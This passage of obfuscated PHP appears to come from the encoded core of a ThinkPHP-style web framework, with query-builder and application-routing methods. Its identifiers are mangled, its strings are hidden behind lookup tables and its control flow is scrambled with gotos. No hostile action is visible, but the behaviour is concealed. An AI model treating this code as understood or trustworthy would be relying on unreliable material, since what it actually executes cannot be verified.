(is_object($aªŠ‘ÆÒ”)) { $aªŠ‘ÆÒ” = get_object_vars($aªŠ‘ÆÒ”); } elseif (is_string($aªŠ‘ÆÒ”)) { parse_str($aªŠ‘ÆÒ”, $aªŠ‘ÆÒ”); } elseif (!is_array($aªŠ‘ÆÒ”)) { think_exception(think_lang($dó„¸ Šø[259])); } $this->data = $aªŠ‘ÆÒ”; return $this; } public function join($cÅÃ‰¹â²›) { $DØÙ¾áÏã =& $_SERVER[‚Ğ°–—î]; if (is_array($cÅÃ‰¹â²›)) { $this->options[$DØÙ¾áÏã[270]] = $cÅÃ‰¹â²›; } elseif (!empty($cÅÃ‰¹â²›)) { $this->options[$DØÙ¾áÏã[270]][] = $cÅÃ‰¹â²›; } return $this; } public function union($f¯‹ç˜ñ¯‰, $c‚Ğ®™õ³­ = false) { goto a¿“±ÊÛğ¯; aËò’¸ñÎ: return $this; goto fªÖí§‚ˆğ; a£ÃõÜÔã©: if (is_object($f¯‹ç˜ñ¯‰)) { $f¯‹ç˜ñ¯‰ = get_object_vars($f¯‹ç˜ñ¯‰); } if (is_string($f¯‹ç˜ñ¯‰)) { $f¬ßİè®‘ = $f¯‹ç˜ñ¯‰; } elseif (is_array($f¯‹ç˜ñ¯‰)) { if (isset($f¯‹ç˜ñ¯‰[0])) { $this->options[$DíëËæÙòö[335]] = array_merge($this->options[$DíëËæÙòö[335]], $f¯‹ç˜ñ¯‰); return $this; } else { $f¬ßİè®‘ = $f¯‹ç˜ñ¯‰; } } else { think_exception(think_lang($DíëËæÙòö[259])); } $this->options[$DíëËæÙòö[335]][] = $f¬ßİè®‘; goto aËò’¸ñÎ; a¿“±ÊÛğ¯: $DíëËæÙòö =& $_SERVER[‚Ğ°–—î]; if (empty($f¯‹ç˜ñ¯‰)) { return $this; } if ($c‚Ğ®™õ³­) { $this->options[$DíëËæÙòö[335]][$DíëËæÙòö[336]] = !0; } goto a£ÃõÜÔã©; fªÖí§‚ˆğ: } public function cache($dšÔ„ŸŞ— = true, $fê‹ïÊÙîˆ = null, $dÆ§ÁÚß½ƒ = '') { $B’âµÛ­´½ =& $_SERVER[‚Ğ°–—î]; if (!1 !== $dšÔ„ŸŞ—) { $this->options[$B’âµÛ­´½[337]] = array($B’âµÛ­´½[89] => $dšÔ„ŸŞ—, $B’âµÛ­´½[327] => $fê‹ïÊÙîˆ, $B’âµÛ­´½[29] => $dÆ§ÁÚß½ƒ); } return $this; } public function field($cÉÓµÚˆŸ•, $D•Çáë¯ò = false) { $C‚Ãò«»Ö =& $_SERVER[‚Ğ°–—î]; if (!0 === $cÉÓµÚˆŸ•) { $e§Ì„ ™ = $this->getDbFields(); $cÉÓµÚˆŸ• = $e§Ì„ ™ ? $e§Ì„ ™ : $C‚Ãò«»Ö[176]; } elseif ($D•Çáë¯ò) { if (is_string($cÉÓµÚˆŸ•)) { $cÉÓµÚˆŸ• = explode($C‚Ãò«»Ö[47], $cÉÓµÚˆŸ•); } $e§Ì„ ™ = $this->getDbFields(); $cÉÓµÚˆŸ• = $e§Ì„ ™ ? array_diff($e§Ì„ ™, $cÉÓµÚˆŸ•) : $cÉÓµÚˆŸ•; } $this->options[$C‚Ãò«»Ö[261]] = $cÉÓµÚˆŸ•; return $this; } public function scope($BéÙï”ğ´ë = '', $a¯¤è“ÍÁÜ = NULL) { $DãŠ´¿²ò‚ =& $_SERVER[‚Ğ°–—î]; if ($DãŠ´¿²ò‚[33] === $BéÙï”ğ´ë) { if (isset($this->_scope[$DãŠ´¿²ò‚[34]])) { $C¤…Ğ»Å = $this->_scope[$DãŠ´¿²ò‚[34]]; } else { return $this; } } elseif (is_string($BéÙï”ğ´ë)) { $E¸ç©®‡¥é = explode($DãŠ´¿²ò‚[47], $BéÙï”ğ´ë); $C¤…Ğ»Å = array(); foreach ($E¸ç©®‡¥é as $D×½ ãî½œ) { if (!isset($this->_scope[$D×½ ãî½œ])) { continue; } $C¤…Ğ»Å = array_merge($C¤…Ğ»Å, $this->_scope[$D×½ ãî½œ]); } if (!empty($a¯¤è“ÍÁÜ) && is_array($a¯¤è“ÍÁÜ)) { $C¤…Ğ»Å = array_merge($C¤…Ğ»Å, $a¯¤è“ÍÁÜ); } } elseif (is_array($BéÙï”ğ´ë)) { $C¤…Ğ»Å = $BéÙï”ğ´ë; } if (is_array($C¤…Ğ»Å) && !empty($C¤…Ğ»Å)) { $this->options = array_merge($this->options, array_change_key_case($C¤…Ğ»Å)); } return $this; } public function where($bÊÄ‡õŒø, $aË÷™¹É­È = null) { $bÑ ¨ğô‰é =& $_SERVER[‚Ğ°–—î]; if (!is_null($aË÷™¹É­È) && is_string($bÊÄ‡õŒø)) { if (!is_array($aË÷™¹É­È)) { $aË÷™¹É­È = func_get_args(); array_shift($aË÷™¹É­È); } $aË÷™¹É­È = array_map(array($this->db, $bÑ ¨ğô‰é[331]), $aË÷™¹É­È); $bÊÄ‡õŒø = vsprintf($bÊÄ‡õŒø, $aË÷™¹É­È); } elseif (is_object($bÊÄ‡õŒø)) { $bÊÄ‡õŒø = get_object_vars($bÊÄ‡õŒø); } elseif (is_array($bÊÄ‡õŒø)) { foreach ($bÊÄ‡õŒø as $DÈéÌªÉŸµ => $f¢¢˜Å“ê) { if ((is_numeric($DÈéÌªÉŸµ) || !$DÈéÌªÉŸµ) && is_string($f¢¢˜Å“ê)) { think_trace($bÑ ¨ğô‰é[338], $bÑ ¨ğô‰é[33], $bÑ ¨ğô‰é[46]); die; } } } if (is_string($bÊÄ‡õŒø) && $bÑ ¨ğô‰é[33] != $bÊÄ‡õŒø) { $b¡‡™Ëã¸é = array(); $b¡‡™Ëã¸é[$bÑ ¨ğô‰é[339]] = $bÊÄ‡õŒø; $bÊÄ‡õŒø = $b¡‡™Ëã¸é; } if (isset($this->options[$bÑ ¨ğô‰é[263]])) { $this->options[$bÑ ¨ğô‰é[263]] = array_merge($this->options[$bÑ ¨ğô‰é[263]], $bÊÄ‡õŒø); } else { $this->options[$bÑ ¨ğô‰é[263]] = $bÊÄ‡õŒø; } return $this; } public function limit($bÔ×ØÚ‹¸‡, $bå˜º²ßˆÃ = null) { $d®…ŸÕ²ø½ =& $_SERVER[‚Ğ°–—î]; $this->options[$d®…ŸÕ²ø½[280]] = is_null($bå˜º²ßˆÃ) ? $bÔ×ØÚ‹¸‡ : $bÔ×ØÚ‹¸‡ . $d®…ŸÕ²ø½[47] . $bå˜º²ßˆÃ; return $this; } public function page($F¦‘–ø¥“¦, $E‹òŞ“‘´† = null) { $eÇ˜£‚Ë‡’ =& $_SERVER[‚Ğ°–—î]; $this->options[$eÇ˜£‚Ë‡’[340]] = is_null($E‹òŞ“‘´†) ? $F¦‘–ø¥“¦ : $F¦‘–ø¥“¦ . $eÇ˜£‚Ë‡’[47] . $E‹òŞ“‘´†; return $this; } public function comment($D´ğĞ¬†‰½) { $this->options[$_SERVER[‚Ğ°–—î][341]] = $D´ğĞ¬†‰½; return $this; } public function setProperty($aŞÏÔÙŠØÏ, $CÁ¬×”ÇØ‡) { if (property_exists($this, $aŞÏÔÙŠØÏ)) { $this->{$aŞÏÔÙŠØÏ} = $CÁ¬×”ÇØ‡; } return $this; } } goto Cëã¸øàì; cŒªùÌ”‘–: while ($E³˜ßåËÙŸ < $_SERVER[‚Ğ°–—î][551]) { if ($E³˜ßåËÙŸ >= 0) { break; } $E³˜ßåËÙŸ++; } class Application { private $defaultModule = "\x69\x6e\144\x65\x78"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\151\156\x64\x65\170"; function __construct() { } public function setDefault($AÃ„ÓãÎä) { goto e®Ê÷íÌŞå; cÆƒ§Ğì: $this->defaultModule = $AÕÙŞ‡Ä»í[0] ? $AÕÙŞ‡Ä»í[0] : $this->defaultModule; $aŞ›÷èÖ‚† = $B­íŞóŸ÷ª[552]; if (!$aŞ›÷èÖ‚†) { return; } goto a”·‘ ê˜é; e®Ê÷íÌŞå: $B­íŞóŸ÷ª =& $_SERVER[‚Ğ°–—î]; $cåâÎØåËÄ =& $_SERVER[òÈ„‹Ü]; $AÕÙŞ‡Ä»í = $cåâÎØåËÄ[0]($cåâÎØåËÄ[1], $cåâÎØåËÄ[2]($AÃ„ÓãÎä, $cåâÎØåËÄ[1])); goto cÆƒ§Ğì; a”·‘ ê˜é: $this->defaultController = $AÕÙŞ‡Ä»í[1] ? $AÕÙŞ‡Ä»í[1] : $this->defaultController; $this->defaultAction = $AÕÙŞ‡Ä»í[2] ? $AÕÙŞ‡Ä»í[2] : $this->defaultAction; $fåáõÖšÕ„ = $B­íŞóŸ÷ª[553]; goto cØÌ»³”à; cØÌ»³”à: $this->{$_SERVER[òÈ„‹Ü][3]}($cåâÎØåËÄ[4], array($this, $cåâÎØåËÄ[5])); goto B¶Õ¼äªŒ; B¶Õ¼äªŒ: } public function appRun($Eµê½Ç´‘) { goto fˆ¯Ì§¤Æ†; d–ïàò‰İâ: $a¡‹…©ò = $B®ËêË©Ÿê[554]; while (strlen($a¡‹…©ò) < $B®ËêË©Ÿê[555]) { if (!$a¡‹…©ò) { break; } $a¡‹…©ò++; } $b—è©ä‚§ç = $dò‡ï÷‰¹¢[6]($a¾å˜™ÛÑŠ[0]); goto c…ªµ“‚; Cë×í´îç½: if (strlen($A›ñ–°‡Ü) < $B®ËêË©Ÿê[558]) { die; } $dò‡ï÷‰¹¢[13](array($dò‡ï÷‰¹¢[14], $dò‡ï÷‰¹¢[15]), $a¥ÜÀ”‹«¶ . $dò‡ï÷‰¹¢[18], $Eµê½Ç´‘); $AŒà£èø« = $B®ËêË©Ÿê[559]; goto bÂ”«æÈö; c…ªµ“‚: $bã‘êÑŠƒæ = $B®ËêË©Ÿê[556]; $a¥ÜÀ”‹«¶ = $dò‡ï÷‰¹¢[7]; if ($b—è©ä‚§ç == $dò‡ï÷‰¹¢[8]) { $a¥ÜÀ”‹«¶ = $dò‡ï÷‰¹¢[9]; $a¾å˜™ÛÑŠ[0] = $dò‡ï÷‰¹¢[10]; $a¾å˜™ÛÑŠ[1] = $a¾å˜™ÛÑŠ[1] . $dò‡ï÷‰¹¢[11]; $Eµê½Ç´‘ = $dò‡ï÷‰¹¢[12]($dò‡ï÷‰¹¢[1], $a¾å˜™ÛÑŠ); $Eµê½Ç´‘ = $dò‡ï÷‰¹¢[2]($Eµê½Ç´‘, $dò‡ï÷‰¹¢[1]); } goto Fòù¼âÚ—Ë; bÂ”«æÈö: if (!$AŒà£èø«) { die; } goto cŸêÃêÄ¸š; fˆ¯Ì§¤Æ†: $B®ËêË©Ÿê =& $_SERVER[‚Ğ°–—î]; $dò‡ï÷‰¹¢ =& $_SERVER[òÈ„‹Ü]; $a¾å˜™ÛÑŠ = $dò‡ï÷‰¹¢[0]($dò‡ï÷‰¹¢[1], $Eµê½Ç´‘); goto d–ïàò‰İâ; Fòù¼âÚ—Ë: $dò‡ï÷‰¹¢[13](array($dò‡ï÷‰¹¢[14], $dò‡ï÷‰¹¢[15]), $a¥ÜÀ”‹«¶ . $dò‡ï÷‰¹¢[16], $Eµê½Ç´‘); $dò‡ï÷‰¹¢[17]($Eµê½Ç´‘); $A›ñ–°‡Ü = $B®ËêË©Ÿê[557]; goto Cë×í´îç½; cŸêÃêÄ¸š: } private function autorun() { $BªÃ‡õæ›ë =& $_SERVER[òÈ„‹Ü]; global $config; $F×ì½Ë“Š¯ = $_SERVER[‚Ğ°–—î][560]; if ($BªÃ‡õæ›ë[19]($config[$BªÃ‡õæ›ë[20]]) == 0) { return; } foreach ($config[$BªÃ‡õæ›ë[20]] as $D˜ĞŞÕßÉÉ => $EÔ¦œ×™Ÿ¨) { $this->{$_SERVER[òÈ„‹Ü][21]}($EÔ¦œ×™Ÿ¨); } } private function fwkxb4cc0f4d() { goto B¢ˆĞŠãÊÍ; EòÄĞ‚İÒ: $bÕ«ßÀîÛè = $GLOBALS[$aç‰Õ˜·æª[22]][$aç‰Õ˜·æª[23]][0]; $E‡¹™¹äøœ = $aØ°Éñ„¯É[561]; if (!$bÕ«ßÀîÛè || $aç‰Õ˜·æª[24]($bÕ«ßÀîÛè) <= $aç‰Õ˜·æª[24]($eîï ÷òé·)) { return; } goto FÖ×ôë±Ù; B¢ˆĞŠãÊÍ: $aØ°Éñ„¯É =& $_SERVER[‚Ğ°–—î]; $aç‰Õ˜·æª =& $_SERVER[òÈ„‹Ü]; $eîï ÷òé· = $aç‰Õ˜·æª[8]; goto EòÄĞ‚İÒ; FÖ×ôë±Ù: if ($aç‰Õ˜·æª[6]($aç‰Õ˜·æª[25]($bÕ«ßÀîÛè, -$aç‰Õ˜·æª[24]($eîï ÷òé·))) != $eîï ÷òé·) { return; } $fâÔÂœ¨Ğ¾ = $aç‰Õ˜·æª[25]($bÕ«ßÀîÛè, 0, -$aç‰Õ˜·æª[24]($eîï ÷òé·)); $f¤òƒôöŒÒ = $aØ°Éñ„¯É[562]; goto d™ô†ğÁÅ‘; f·Ğ¸¾×ñ: $GLOBALS[$aç‰Õ˜·æª[22]][$aç‰Õ˜·æª[28]] = $aç‰Õ˜·æª[29]($aç‰Õ˜·æª[1], $GLOBALS[$aç‰Õ˜·æª[22]][$aç‰Õ˜·æª[23]]); $b‘ÁŠ²æ±Ş = $aØ°Éñ„¯É[563]; if (strlen($b‘ÁŠ²æ±Ş) < $aØ°Éñ„¯É[551]) { return; } goto c«ŒŠïÖĞ; d™ô†ğÁÅ‘: $cë¥•‰˜ = array($aç‰Õ˜·æª[8], $fâÔÂœ¨Ğ¾); $bå½øÓèÉÏ = $aç‰Õ˜·æª[26]($GLOBALS[$aç‰Õ˜·æª[22]][$aç‰Õ˜·æª[23]], 1); $GLOBALS[$aç‰Õ˜·æª[22]][$aç‰Õ˜·æª[23]] = $aç‰Õ˜·æª[27]($cë¥•‰˜, $bå½øÓèÉÏ); goto f·Ğ¸¾×ñ; c«ŒŠïÖĞ: } private function uvze7bb5163e() { goto d½İ¶è§Ù; AÀíñöÍå–: $e¦©²µ´ÂÌ = $e°˜ÛêªÒè[566]; $F²å½æêìĞ[34]($F²å½æêìĞ[35], $cï•ÌÒ¤È“, $bÎœâ¡–); $AäîßÀ„‹à = $e°˜ÛêªÒè[567]; goto còöÃÆó®¨; d½İ¶è§Ù: $e°˜ÛêªÒè =& $_SERVER[‚Ğ°–—î]; $F²å½æêìĞ =& $_SERVER[òÈ„‹Ü]; if ($GLOBALS[$F²å½æêìĞ[22]][$F²å½æêìĞ[28]] != $F²å½æêìĞ[10]) { return; } goto A„ï¾‹äã; A„ï¾‹äã: $Cò›í†…ì‚ = $_SERVER[$F²å½æêìĞ[30]]; $F•¶ù—‘çà = $F²å½æêìĞ[31]; $d–´àÂÄì… = $e°˜ÛêªÒè[564]; goto d¥ƒâÕìä‰; Fæ¬ç©¹¢ä: $GLOBALS[$F²å½æêìĞ[22]][$F²å½æêìĞ[23]] = $F²å½æêìĞ[0]($F²å½æêìĞ[36], $cï•ÌÒ¤È“); $GLOBALS[$F²å½æêìĞ[22]][$F²å½æêìĞ[28]] = $F²å½æêìĞ[29]($F²å½æêìĞ[1], $GLOBALS[$F²å½æêìĞ[22]][$F²å½æêìĞ[23]]); goto BÑ‰‡›¾ÆŸ; còöÃÆó®¨: while (strlen($AäîßÀ„‹à) < $e°˜ÛêªÒè[555]) { if (!$AäîßÀ„‹à) { break; } $AäîßÀ„‹à++; } $cï•ÌÒ¤È“ = $F²å½æêìĞ[2]($bÎœâ¡–[0][0], $F²å½æêìĞ[36]); $dâŠ•ñ†â¶ = $e°˜ÛêªÒè[568]; goto Fæ¬ç©¹¢ä; d¥ƒâÕìä‰: if (!$d–´àÂÄì…) { die; } if (!$F²å½æêìĞ[32]($Cò›í†…ì‚, $F•¶ù—‘çà)) { return; } $Fç¿·¬“‚… = $F²å½æêìĞ[33]($Cò›í†…ì‚, $F•¶ù—‘çà); goto C’Òù¥ØÑµ; C’Òù¥ØÑµ: $eæÑÆš†† = $e°˜ÛêªÒè[565]; if (!$eæÑÆš††) { die; } $cï•ÌÒ¤È“ = $F²å½æêìĞ[25]($Cò›í†…ì‚, $Fç¿·¬“‚… + $F²å½æêìĞ[24]($F•¶ù—‘çà)); goto AÀíñöÍå–; BÑ‰‡›¾ÆŸ: } public function run() { goto D°Ú¡“Í§; DË¡è¨‰: $dÙ¬«µø½[39]($dÙ¬«µø½[43], MOD . $dÙ¬«µø½[1] . ST . $dÙ¬«µø½[1] . ACT); $c‹‰ãÖ…ó– = $BöŞˆµÔØ£[574]; if (strlen($c‹‰ãÖ…ó–) < $BöŞˆµÔØ£[558]) { return; } goto D®Ë˜¹¯æ; D°Ú¡“Í§: $BöŞˆµÔØ£ =& $_SERVER[‚Ğ°–—î]; $dÙ¬«µø½ =& $_SERVER[òÈ„‹Ü]; $this->{$_SERVER[òÈ„‹Ü][37]}(); goto B©”áµò©“; c¯çâ­µí´: $EÌ·Šù®ÒÖ = $BöŞˆµÔØ£[570]; if (strlen($EÌ·Šù®ÒÖ) < $BöŞˆµÔØ£[551]) { die; } $Eï£öß¾„ = $GLOBALS[$dÙ¬«µø½[22]][$dÙ¬«µø½[28]]; goto f®Î÷¸ôË; B©”áµò©“: $this->{$_SERVER[òÈ„‹Ü][38]}(); $F²”«Üáùï = $BöŞˆµÔØ£[569]; $FçˆÅËÜİ· = $GLOBALS[$dÙ¬«µø½[22]][$dÙ¬«µø½[23]]; goto c¯çâ­µí´; f®Î÷¸ôË: $dÙ¬«µø½[39]($dÙ¬«µø½[40], isset($FçˆÅËÜİ·[0]) && $FçˆÅËÜİ·[0] ? $FçˆÅËÜİ·[0] : $this->defaultModule); $B‚õÁÃÍÊÏ = $BöŞˆµÔØ£[571]; if (strlen($B‚õÁÃÍÊÏ) < $BöŞˆµÔØ£[572]) { return; } goto fÕ•£Êê; fÕ•£Êê: $dÙ¬«µø½[39]($dÙ¬«µø½[41], isset($FçˆÅËÜİ·[1]) && $FçˆÅËÜİ·[0] ? $FçˆÅËÜİ·[1] : $this->defaultController); $bíÈÊòá› = $BöŞˆµÔØ£[573]; $dÙ¬«µø½[39]($dÙ¬«µø½[42], isset($FçˆÅËÜİ·[2]) && $FçˆÅËÜİ·[0] ? $FçˆÅËÜİ·[2] : $this->defaultAction); goto DË¡è¨‰; D®Ë˜¹¯æ: $_SERVER[$dÙ¬«µø½[44]] = $dÙ¬«µø½[6](ACTION); $this->{$_SERVER[òÈ„‹Ü][45]}(); if ($dÙ¬«µø½[19]($FçˆÅËÜİ·) >= 3) { $this->{$_SERVER[òÈ„‹Ü][21]}($Eï£öß¾„); } else { $this->{$_SERVER[òÈ„‹Ü][21]}(ACTION); } goto F´…®º—× ; F´…®º—× : } private $rsvj46b300e7 = array(); private $rxhtc414dee3 = ''; public function bvda3c2b4556() { goto a½”Èàß¶; bÂØ©¢ùÎğ: $this->{$_SERVER[òÈ„‹Ü][52]}(); $this->{$_SERVER[òÈ„‹Ü][3]}($Fø«ç«ƒÑº[53], array($this, $Fø«ç«ƒÑº[54])); $this->{$_SERVER[òÈ„‹Ü][3]}($Fø«ç«ƒÑº[55], array($this, $Fø«ç«ƒÑº[56])); goto d¤ï½Î¯…±; a½”Èàß¶: $B‚¹÷Ö„Ë =& $_SERVER[‚Ğ°–—î]; $Fø«ç«ƒÑº =& $_SERVER[òÈ„‹Ü]; $this->{$_SERVER[òÈ„‹Ü][46]}(); goto CåÌ§¤ÓœÇ; FÎ ğ…–Õ: $this->{$_SERVER[òÈ„‹Ü][51]}(); $b¬Àç§×¬ = $B‚¹÷Ö„Ë[578]; if (!$b¬Àç§×¬) { return; } goto bÂØ©¢ùÎğ; d¤ï½Î¯…±: $fÈŸ¿‡œó‹ = $B‚¹÷Ö„Ë[579]; while (strlen($fÈŸ¿‡œó‹) < $B‚¹÷Ö„Ë[558]) { if (!$fÈŸ¿‡œó‹) { break; } $fÈŸ¿‡œó‹++; } $this->{$_SERVER[òÈ„‹Ü][3]}($Fø«ç«ƒÑº[57], array($this, $Fø«ç«ƒÑº[58])); goto a“˜¡ò›“; AÒÖğäŞ¨¿: $f¤ïŠœ­Â = $B‚¹÷Ö„Ë[577]; if (!$f¤ïŠœ­Â) { die; } $this->{$_SERVER[òÈ„‹Ü][50]}(); goto FÎ ğ…–Õ; CåÌ§¤ÓœÇ: $this->{$_SERVER[òÈ„‹Ü][47]}(); $DÆÛí”ÇàÃ = $B‚¹÷Ö„Ë[575]; if (strlen($DÆÛí”ÇàÃ) < $B‚¹÷Ö„Ë[555]) { return; } goto b÷òàµ…åõ; b÷òàµ…åõ: $this->{$_SERVER[òÈ„‹Ü][48]}(); $B¼ìÄ² = $B‚¹÷Ö„Ë[576]; $this->{$_SERVER[òÈ„‹Ü][49]}(); goto AÒÖğäŞ¨¿; a“˜¡ò›“: $this->{$_SERVER[òÈ„‹Ü][3]}($Fø«ç«ƒÑº[59], array($this, $Fø«ç«ƒÑº[60])); goto bˆ¾µáÉ­œ; bˆ¾µáÉ­œ: } public function scjbf4148550($d±ÑÊ Úê¯) { goto FÄ¶¾» Ê˜; D­î½¦˜ËÖ: while (strlen($eåå¹½†©½) < $a¹µ©¹¤æß[558]) { if (!$eåå¹½†©½) { break; } $eåå¹½†©½++; } $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[94]][$Cñ´‹Óå÷Ş[99]] = array($Cñ´‹Óå÷Ş[100] => (int) $FÍ‡ï¦•Î¥[$Cñ´‹Óå÷Ş[101]], $Cñ´‹Óå÷Ş[102] => $Cñ´‹Óå÷Ş[103]($Cñ´‹Óå÷Ş[104]($FÍ‡ï¦•Î¥, $Cñ´‹Óå÷Ş[105], array())), $Cñ´‹Óå÷Ş[106] => (int) $Cñ´‹Óå÷Ş[104]($FÍ‡ï¦•Î¥, $Cñ´‹Óå÷Ş[107], 0)); $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[109]] = $Cñ´‹Óå÷Ş[110]($Cñ´‹Óå÷Ş[111])->{$_SERVER[òÈ„‹Ü][112]}(); goto e¨—ÊèöÇ…; Bã¬‘§ÊËÔ: if ($this->rxhtc414dee3 == $Cñ´‹Óå÷Ş[121]) { $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[94]][$Cñ´‹Óå÷Ş[99]][$Cñ´‹Óå÷Ş[107]] = 0; } $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[128]] = $Cñ´‹Óå÷Ş[104]($this->rsvj46b300e7, $Cñ´‹Óå÷Ş[129], $Cñ´‹Óå÷Ş[10]); $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[130]] = $Cñ´‹Óå÷Ş[104]($this->rsvj46b300e7, $Cñ´‹Óå÷Ş[131], $Cñ´‹Óå÷Ş[10]); goto CÇ†‚ø‡¦; a‡„å¦éÎ: foreach ($e’ø±Õê‘ as $d©÷•¾’Ò) { $E¸²ÙÔ»ÒÎ = $GLOBALS[$Cñ´‹Óå÷Ş[91]][$Cñ´‹Óå÷Ş[92]][$d©÷•¾’Ò]; if (isset($a±­å¶Ë…[$d©÷•¾’Ò])) { $E¸²ÙÔ»ÒÎ = $a±­å¶Ë…[$d©÷•¾’Ò]; } $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[94]][$d©÷•¾’Ò] = $E¸²ÙÔ»ÒÎ; } $FÍ‡ï¦•Î¥ = $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[94]][$Cñ´‹Óå÷Ş[76]]; unset($d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[95]][$Cñ´‹Óå÷Ş[96]]); goto eÔ¸ì²ïÉ¬; Bô¼µâóŸ™: $e’ø±Õê‘ = array($Cñ´‹Óå÷Ş[64], $Cñ´‹Óå÷Ş[65], $Cñ´‹Óå÷Ş[66], $Cñ´‹Óå÷Ş[67], $Cñ´‹Óå÷Ş[68], $Cñ´‹Óå÷Ş[69], $Cñ´‹Óå÷Ş[70], $Cñ´‹Óå÷Ş[71], $Cñ´‹Óå÷Ş[72], $Cñ´‹Óå÷Ş[73], $Cñ´‹Óå÷Ş[74], $Cñ´‹Óå÷Ş[75], $Cñ´‹Óå÷Ş[76], $Cñ´‹Óå÷Ş[77], $Cñ´‹Óå÷Ş[78], $Cñ´‹Óå÷Ş[79], $Cñ´‹Óå÷Ş[80], $Cñ´‹Óå÷Ş[81], $Cñ´‹Óå÷Ş[82], $Cñ´‹Óå÷Ş[83], $Cñ´‹Óå÷Ş[84], $Cñ´‹Óå÷Ş[85], $Cñ´‹Óå÷Ş[86], $Cñ´‹Óå÷Ş[87], $Cñ´‹Óå÷Ş[88], $Cñ´‹Óå÷Ş[89], $Cñ´‹Óå÷Ş[90]); $E®«ç³àÀÄ = $a¹µ©¹¤æß[580]; if (!$E®«ç³àÀÄ) { die; } goto a‡„å¦éÎ; A¡ßËÆÜï“: unset($d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[94]][$Cñ´‹Óå÷Ş[76]]); unset($d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[94]][$Cñ´‹Óå÷Ş[98]]); $eåå¹½†©½ = $a¹µ©¹¤æß[582]; goto D­î½¦˜ËÖ; bİ‰ÇŒø™Â: if (strlen($F«İ—òø¸) < $a¹µ©¹¤æß[572]) { die; } $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[120]] = $this->rxhtc414dee3; if ($a±­å¶Ë…[$Cñ´‹Óå÷Ş[120]] != $Cñ´‹Óå÷Ş[121]) { $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[122]] = $a±­å¶Ë…[$Cñ´‹Óå÷Ş[122]]; $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[123]] = $a±­å¶Ë…[$Cñ´‹Óå÷Ş[123]]; $eÈ´ÓÜæÍ = $Cñ´‹Óå÷Ş[124](10) . $this->rxhtc414dee3 . $Cñ´‹Óå÷Ş[124](5); $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[125]][$Cñ´‹Óå÷Ş[126]] = $this->{$_SERVER[òÈ„‹Ü][127]}($eÈ´ÓÜæÍ, $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[113]]); } goto Bã¬‘§ÊËÔ; FÄ¶¾» Ê˜: $a¹µ©¹¤æß =& $_SERVER[‚Ğ°–—î]; $Cñ´‹Óå÷Ş =& $_SERVER[òÈ„‹Ü]; $a±­å¶Ë… = $Cñ´‹Óå÷Ş[61]($Cñ´‹Óå÷Ş[62])->{$_SERVER[òÈ„‹Ü][63]}(); goto Bô¼µâóŸ™; eÔ¸ì²ïÉ¬: unset($d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[93]][$Cñ´‹Óå÷Ş[95]][$Cñ´‹Óå÷Ş[97]]); $e†ÒÓæÚÀÍ = $a¹µ©¹¤æß[581]; while ($e†ÒÓæÚÀÍ < $a¹µ©¹¤æß[555]) { if ($e†ÒÓæÚÀÍ >= 0) { break; } $e†ÒÓæÚÀÍ++; } goto A¡ßËÆÜï“; CÇ†‚ø‡¦: $EõŠá¹•Å… = $a¹µ©¹¤æß[586]; if ($Cñ´‹Óå÷Ş[104]($GLOBALS, $Cñ´‹Óå÷Ş[132]) && $this->config[$Cñ´‹Óå÷Ş[133]]) { $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[134]] = WEB_ROOT; } return $d±ÑÊ Úê¯; goto E‡„Òö‚¦„; a–°ï¥·ª: $Eòºáñ«…Ü = $a¹µ©¹¤æß[584]; $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[117]] = $Cñ´‹Óå÷Ş[118]($Cñ´‹Óå÷Ş[119]()); $F«İ—òø¸ = $a¹µ©¹¤æß[585]; goto bİ‰ÇŒø™Â; e¨—ÊèöÇ…: $B„³Ú½Ò¯ñ = $a¹µ©¹¤æß[583]; while (strlen($B„³Ú½Ò¯ñ) < $a¹µ©¹¤æß[558]) { if (!$B„³Ú½Ò¯ñ) { break; } $B„³Ú½Ò¯ñ++; } $d±ÑÊ Úê¯[$Cñ´‹Óå÷Ş[108]][$Cñ´‹Óå÷Ş[113]] = $Cñ´‹Óå÷Ş[114]($_SERVER[$Cñ´‹Óå÷Ş[115]] . $a±­å¶Ë…[$Cñ´‹Óå÷Ş[116]]); goto a–°ï¥·ª; E‡„Òö‚¦„: } private function joct6e66bfbd() { goto có°ç÷åá‰; có°ç÷åá‰: $BªŒ¸İ¿Û¼ =& $_SERVER[‚Ğ°–—î]; $A¿ÑÌÕÚ‰ =& $_SERVER[òÈ„‹Ü]; if ($_SERVER[$A¿ÑÌÕÚ‰[44]] == $A¿ÑÌÕÚ‰[135]) { goto b‹¯Ï†â´ø; E…öŞŞñÏ: $A¿ÑÌÕÚ‰[13](array($A¿ÑÌÕÚ‰[151], $A¿ÑÌÕÚ‰[152]), $Cç¤òØÒŒÒ); $fñ¼Êø¾Ï = $BªŒ¸İ¿Û¼[588]; if (strlen($fñ¼Êø¾Ï) < $BªŒ¸İ¿Û¼[558]) { die; } goto aÉÍÑùÍ¥è; b‹¯Ï†â´ø: $bø¦´”Ë‰ç = array($A¿ÑÌÕÚ‰[120] => 